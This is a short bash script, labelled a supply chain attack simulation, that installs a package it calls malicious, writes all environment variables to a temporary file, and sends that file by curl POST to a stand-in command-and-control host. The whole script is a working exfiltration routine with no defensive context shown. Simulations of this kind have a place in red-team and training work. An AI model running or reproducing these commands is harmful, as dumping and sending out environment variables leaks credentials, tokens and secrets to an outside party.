#!/bin/bash
# Supply chain attack simulation

# Step 1: Install dependencies with a malicious postinstall
pip install evil-package-1.0.0

# Step 2: Harvest environment
printenv > /tmp/env.txt

# Step 3: Exfil over HTTP
curl -X POST https://c2.example.com/collect -d @/tmp/env.txt
